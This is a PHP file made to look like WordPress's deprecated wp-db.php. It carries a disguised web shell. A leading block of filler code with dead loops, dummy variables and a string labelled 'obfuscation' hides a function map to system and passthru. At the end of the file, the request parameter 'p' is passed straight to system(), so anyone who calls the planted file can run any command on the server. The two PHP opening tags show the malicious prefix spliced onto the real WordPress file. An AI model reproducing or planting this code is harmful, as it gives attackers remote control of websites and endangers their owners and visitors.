<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * WordPress database access abstraction class.
 *
 * This file is deprecated, use 'wp-includes/class-wpdb.php' instead.
 *
 * @deprecated 6.1.0
 * @package WordPress
 */

if ( function_exists( '_deprecated_file' ) ) {
	// Note: WPINC may not be defined yet, so 'wp-includes' is used here.
	_deprecated_file( basename( __FILE__ ), '6.1.0', 'wp-includes/class-wpdb.php' );
}

/** wpdb class */
require_once __DIR__ . '/class-wpdb.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>